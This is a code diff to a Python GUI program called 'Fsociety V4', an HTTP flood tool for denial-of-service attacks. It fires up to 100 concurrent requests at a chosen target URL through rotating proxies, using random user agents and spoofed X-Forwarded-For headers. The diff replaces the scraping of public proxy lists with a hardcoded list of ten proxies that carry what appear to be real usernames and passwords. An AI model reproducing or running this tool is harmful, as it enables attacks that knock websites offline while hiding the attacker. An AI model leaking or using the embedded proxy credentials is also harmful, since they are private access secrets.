@@ -3,7 +3,6 @@ import requests
 import asyncio
 import aiohttp
 import random
-import re
 import itertools
 from PyQt5.QtWidgets import (
     QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
@@ -51,48 +50,19 @@ UserAgents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0"
 ]
 
-ip_list_urls = list(set([
-    "https://www.us-proxy.org",
-    "https://www.socks-proxy.net",
-    "https://proxyscrape.com/free-proxy-list",
-    "https://www.proxynova.com/proxy-server-list/",
-    "https://proxybros.com/free-proxy-list/",
-    "https://proxydb.net/",
-    "https://spys.one/en/free-proxy-list/",
-    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1",
-    "https://hasdata.com/free-proxy-list",
-    "https://www.proxyrack.com/free-proxy-list/",
-    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
-    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
-    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
-    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
-    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
-    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
-    "https://geonode.com/free-proxy-list",
-    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
-    "https://free-proxy-list.net/",
-    "https://advanced.name/freeproxy",
-    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/proxylist.txt",
-    "https://raw.githubusercontent.com/a2u/free-proxy-list/master/free-proxy-list.txt",
-    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
-    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
-    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
-    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
-    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
-    "https://raw.githubusercontent.com/andigwandi/free-proxy/main/proxy-list.txt",
-    "https://www.proxy-list.download/HTTPS",
-    "https://www.proxy-list.download/SOCKS4",
-    "https://www.proxy-list.download/SOCKS5",
-    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&anonymity=all",
-    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&anonymity=all",
-    "https://www.freeproxylists.net/",
-    "https://hidemy.name/en/proxy-list/",
-    "https://www.sslproxies.org/",
-    "https://freeproxylist.ru/",
-    "https://proxy-list.org/english/index.php",
-    "https://www.proxylistpro.com/",
-    "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/main/proxies.txt",
-]))
+# Custom proxy list with credentials
+PROXIES = [
+    "23.95.150.145:6114:nwzwjbye:t63tczwl2s7u",
+    "198.23.239.134:6540:nwzwjbye:t63tczwl2s7u",
+    "45.38.107.97:6014:nwzwjbye:t63tczwl2s7u",
+    "207.244.217.165:6712:nwzwjbye:t63tczwl2s7u",
+    "107.172.163.27:6543:nwzwjbye:t63tczwl2s7u",
+    "104.222.161.211:6343:nwzwjbye:t63tczwl2s7u",
+    "64.137.96.74:6641:nwzwjbye:t63tczwl2s7u",
+    "216.10.27.159:6837:nwzwjbye:t63tczwl2s7u",
+    "136.0.207.84:6661:nwzwjbye:t63tczwl2s7u",
+    "142.147.128.93:6593:nwzwjbye:t63tczwl2s7u"
+]
 
 class AttackThread(QThread):
     log_signal = pyqtSignal(str)
@@ -104,77 +74,52 @@ class AttackThread(QThread):
         self.target_url = target_url
         self.num_requests = num_requests
         self.is_running = True
-        self.proxy_refresh_time = 3600  # Refresh proxies every hour, though not implemented in loop
-
-    async def fetch_proxies(self, url):
-        async with aiohttp.ClientSession() as session:
-            try:
-                async with session.get(url, timeout=10) as response:
-                    if response.status == 200:
-                        text = await response.text()
-                        proxies = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}\b', text)
-                        return proxies
-                    else:
-                        self.log_signal.emit(f"Failed to fetch from {url}: Status {response.status}")
-                        return []
-            except Exception as e:
-                self.log_signal.emit(f"Error fetching proxy list from {url}: {str(e)}")
-                return []
-
-    async def get_all_proxies(self):
-        tasks = [self.fetch_proxies(url) for url in ip_list_urls]
-        proxy_lists = await asyncio.gather(*tasks)
-        all_proxies = list(set([proxy for sublist in proxy_lists for proxy in sublist]))  # Unique proxies
-        random.shuffle(all_proxies)
-        self.log_signal.emit(f"Fetched {len(all_proxies)} unique proxies.")
-        return all_proxies
 
     async def test_proxy(self, session, proxy):
         try:
-            async with session.get('http://httpbin.org/ip', proxy=f"http://{proxy}", timeout=5) as response:
+            ip, port, username, password = proxy.split(':')
+            proxy_url = f"http://{username}:{password}@{ip}:{port}"
+            async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=5) as response:
                 if response.status == 200:
                     return proxy
         except Exception:
-            pass
-        return None
+            return None
 
-    async def get_working_proxies(self, all_proxies):
+    async def get_working_proxies(self):
         async with aiohttp.ClientSession() as session:
-            tasks = [self.test_proxy(session, proxy) for proxy in all_proxies]
+            tasks = [self.test_proxy(session, proxy) for proxy in PROXIES]
             results = await asyncio.gather(*tasks)
             working_proxies = [p for p in results if p is not None]
-            self.log_signal.emit(f"Found {len(working_proxies)} working proxies.")
+            self.log_signal.emit(f"Found {len(working_proxies)} working proxies out of {len(PROXIES)}.")
             return working_proxies
 
     async def send_request(self, session, proxy, semaphore):
         if not self.is_running:
             return
         async with semaphore:
+            ip, port, username, password = proxy.split(':')
+            proxy_url = f"http://{username}:{password}@{ip}:{port}"
             headers = {
                 "User-Agent": random.choice(UserAgents),
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.5",
                 "Connection": "keep-alive",
-                "X-Forwarded-For": proxy.split(':')[0],
+                "X-Forwarded-For": ip,
             }
             try:
-                async with session.get(self.target_url, headers=headers, proxy=f"http://{proxy}", timeout=10) as response:
+                async with session.get(self.target_url, headers=headers, proxy=proxy_url, timeout=10) as response:
                     status = response.status
-                    self.log_signal.emit(f"Attack on {self.target_url} via {proxy} - Status: {status}")
+                    self.log_signal.emit(f"Attack on {self.target_url} via {ip}:{port} - Status: {status}")
             except Exception as e:
-                self.log_signal.emit(f"Error sending request via {proxy}: {str(e)}")
+                self.log_signal.emit(f"Error sending request via {ip}:{port}: {str(e)}")
 
     async def attack(self):
-        all_proxies = await self.get_all_proxies()
-        if not all_proxies:
-            self.log_signal.emit("No proxies found. Aborting attack.")
-            return
-        working_proxies = await self.get_working_proxies(all_proxies)
+        working_proxies = await self.get_working_proxies()
         if not working_proxies:
             self.log_signal.emit("No working proxies found. Aborting attack.")
             return
         proxy_cycle = itertools.cycle(working_proxies)
-        semaphore = asyncio.Semaphore(100)  # Increased concurrency
+        semaphore = asyncio.Semaphore(100)
         async with aiohttp.ClientSession() as session:
             tasks = []
             for i in range(self.num_requests):
@@ -200,7 +145,7 @@ class AttackThread(QThread):
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("Fsociety V4 - Ultimate Edition")
+        self.setWindowTitle("Fsociety V4 - Custom Proxy Edition")
         self.setGeometry(200, 200, 600, 600)
         self.setStyleSheet("background-color: #191919; color: white;")
 
@@ -353,4 +298,3 @@ if __name__ == "__main__":
     window = MainWindow()
     window.show()
     sys.exit(app.exec_())
-```
